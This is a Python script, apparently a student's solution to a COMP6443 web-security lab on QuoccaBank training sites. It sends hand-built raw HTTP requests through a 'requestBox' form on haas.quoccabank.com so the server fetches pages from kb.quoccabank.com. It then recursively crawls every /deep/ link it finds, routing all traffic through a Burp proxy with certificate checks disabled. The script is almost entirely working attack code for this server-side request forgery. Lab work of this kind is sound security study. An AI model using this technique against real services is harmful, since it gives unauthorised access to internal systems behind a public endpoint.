# -*- coding: utf-8 -*-
"""
Created on Sat Feb 24 14:21:50 2024

@author: lindu.wicaksana
"""

import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import re

# Silences warnings about not verifying Burp's CA certificate.
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

s = (
    requests.session()
)  # This session object saves our settings for the lifetime of the script.
s.verify = False  # Skip trying to verify TLS certs, due to Burp's CA.
s.proxies = {
    "https": "http://127.0.0.1:8080",
    "http": "http://127.0.0.1:8080",
}  # Proxy requests through Burp.


url = "http://haas.quoccabank.com"

# Specify the HTTP request headers
headers = {
    "Content-Type": "application/x-www-form-urlencoded",
    "Referer": "http://haas.quoccabank.com/",
}
get_request = "GET /deep HTTP/1.1\r\n"
get_request += "Host: kb.quoccabank.com\r\n"
get_request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n"
get_request += "Accept-Language: en-US,en;q=0.5\r\n"
get_request += "Referer: http://haas.quoccabank.com\r\n"
get_request += "Content-Type: application/x-www-form-urlencoded\n"
get_request += "Origin: http://haas.quoccabank.com\r\n"
get_request += "Connection: keep-alive\r\n\r\n"
data = {"requestBox": get_request}
response = s.post(url, headers=headers, data=data)
print(response.text)
# ... (Your existing code for making the request) ...

# Extract all <li> elements into a set
# Extract all <li> elements into a list
li_elements = set(re.findall(r'<li><a href="/deep/([^"]+)">', response.text))
li_elements_list = list(li_elements)  # Convert set to list for sequential processing

# Iterate through all elements in the list
while li_elements_list:
    current_li = li_elements_list.pop(0)  # Remove and process the first element
    print (current_li)
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Referer": "http://haas.quoccabank.com/",
    }
    get_request = f"GET /deep/{current_li} HTTP/1.1\r\n"
    get_request += "Host: kb.quoccabank.com\r\n"
    get_request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n"
    get_request += "Accept-Language: en-US,en;q=0.5\r\n"
    get_request += "Referer: http://haas.quoccabank.com\r\n"
    get_request += "Content-Type: application/x-www-form-urlencoded\n"
    get_request += "Origin: http://haas.quoccabank.com\r\n"
    get_request += "Connection: keep-alive\r\n\r\n"
    data = {"requestBox": get_request}
    response = s.post(url, headers=headers, data=data)
    print (response.text)
    

    # ... (Rest of your code for making the request, checking for "COMP6443", and extracting new <li> elements) ...

    # Add new elements to the end of the list to preserve processing order
    # Initialize new_li_elements for each iteration
    new_li_elements = set()  # This variable is now initialized within the loop

    # Add new elements to the set
    new_li_elements.update(re.findall(r'<li><a href="/deep/([^"]+)">', response.text))

    # Add new elements to the end of the list to preserve processing order
    li_elements_list.extend(new_li_elements - li_elements)
    li_elements.update(new_li_elements)

# Print the final set of processed elements (optional)
print(li_elements)
